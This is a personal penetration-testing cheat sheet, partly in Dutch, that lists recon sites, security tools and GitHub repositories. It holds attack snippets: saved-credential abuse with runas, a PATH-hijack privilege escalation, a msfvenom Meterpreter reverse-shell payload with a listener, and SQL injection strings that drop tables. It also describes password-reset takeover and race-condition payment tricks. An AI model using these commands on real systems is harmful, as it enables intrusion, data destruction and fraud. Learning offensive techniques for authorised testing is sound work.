# stuff to try and then put on a "correct" place in the step_by_Step

https://www.google.com/advanced_search
https://10015.io/
https://appetize.io/
https://http.cat/status/201
https://www.rapid7.com/db/

smap => nmap
smap nmap maar lookup van shodan, dan nmap van die open poorten

# windows
cmdkey /list
runas /savecred /user:{usernamefromcmdkeylist} cmd.exe

schtasks /query /fo list /v

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

# linux
getcap -r / 2>/dev/null
beetje als gtfobins

path exploit
export PATH=/tmp:$PATH
nano "/bin/bash">/tmp/{foundnameofsomethingthatexecutesabinarywithpriviliges}

msfconsole
systemctl start postgresql
msfdb init
db_status 
workspace -a {name}
db_nmap -sV -p- {ip}
use {exploit}
hosts -R
msfvenom #generate shell binarys fe: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 -f elf > rev_shell.elf
use exploit/multi/handler #same as nc -lvnp {port}
set payload linux/x86/meterpreter/reverse_tcp
set lhost {ip}
set lport 4444
ctrl+z #session in the background to use for later

# tools
steghide --extract {file}

ssrf:
requestbin.com

{url}/robots.txt
crt.sh
sublister

pestudio
procexp
procmon
cff explorer


kerbrute
go witnes
nuclei
caido
lazygit
git bisect
wpscan
dirsearch
spiderfoeot
sherlock
gitleaks

https://threatfox.abuse.ch/browse/
https://sslbl.abuse.ch/

https://learn.microsoft.com/en-us/security/

https://learn.microsoft.com/en-us/training/browse/?hideCompleted=true&levels=beginner&subjects=security&resource_type=learning%20path&roles=security-engineer

authenticate network time protocol
Als gespoofd kan ddos voor authenticatie denyen doordat time niet goed is
certificate can "expire"

MICROSoft cloud defender
intel explorer

https://docs.google.com/file/d/0B7d_gqEI7itKMTJxc0dycFhvUmM/edit?resourcekey=0-UVtEXBuq4nWE75ZNCmKw8g

https://github.com/freelabz/secator

https://github.com/hacking-support/DVUEFI

http://www.catb.org/esr/faqs/hacker-howto.html

C:\Windows\ImmersiveControlPanel\Settings\AllSystemSettings_{253E530E-387D-4BC2-959D-E6F86122E5F2}.xml

emailrep.io

dirbuster

flask-unsign

https://github.com/p1ngul1n0/blackbird
https://github.com/RevoltSecurities/Subdominator
https://github.com/Sn1r/Forbidden-Buster
https://github.com/lobuhi/byp4xx
https://github.com/iamj0ker/bypass-403
https://github.com/dirtycoder0124/formcrawler
https://github.com/shaikhsajid1111/social-media-profile-scrapers
https://github.com/m4ll0k/SecretFinder
https://github.com/martinvigo/email2phonenumber?tab=readme-ov-file
https://github.com/z0m31en7/Uscrapper
https://github.com/twelvesec/gasmask
https://github.com/un9nplayer/AutoRecon-XSS
https://github.com/gtworek/PSBits/tree/master/NetShRun
https://github.com/PaulNorman01/Forensia
https://github.com/z0m31en7/Uscrapper
https://github.com/XDeadHackerX/NetSoc_OSINT
https://github.com/lefayjey/linWinPwn
https://github.com/0x2458bughunt/SQLi-Automation
https://github.com/projectdiscovery/cdncheck
https://github.com/EmperialX/XSS-Automation-Tool
https://github.com/ethicalhackingplayground/pathbuster
https://github.com/channyein1337/jsleak
https://github.com/MattKeeley/Spoofy
https://github.com/projectdiscovery/notify
https://github.com/gwen001/gitpillage
https://github.com/securebinary/o365sprayer
https://github.com/lc/theftfuzzer
https://github.com/GerbenJavado/LinkFinder
https://github.com/tomnomnom/unfurl
https://github.com/peass-ng/PEASS-ng
https://github.com/rebootuser/LinEnum
https://github.com/DominicBreuker/pspy
https://github.com/linted/linuxprivchecker




sherlock -u ausername
gitdumper
katana
corscanner
sshbrute
intel one
eagleeye
xss2png
getallurls

site:{site.com} inurl:test | inurl:env | inurl:dev | inurl:staging | inurl:sandbox | inurl:debug | inurl:temp | inurl:internal | inurl:demo

impacket

az interactive: so no az needs to be typed each time
az upgrade
az vm list
az vm list-ip-addresses
az network public-ip list
az network nsg list --query '[].name' --output tsv

https://techcommunity.microsoft.com/t5/security-compliance-and-identity/join-our-microsoft-security-community/ba-p/927888
veeamclick.be


reset email functie,
als reset email heeft en een user id,
reset email veranderen en dan krijgj misschien email op de attackers email


when sending money or other moneytary "values" send parralel requests, example:
in burp request, send to repeat, edit things, add to group, duplicate request, send- in paralels




https://github.com/TheSysRat/Hammer--THM/blob/main/pin-brute.py



12345'; UPDATE books SET book_name = 'Hacked'; --
12345'; DROP TABLE hello; --
1' OR 1=1 --
Intro to PHP' || 1=1 --
1%27%0A||%0A1=1%0A--%27+

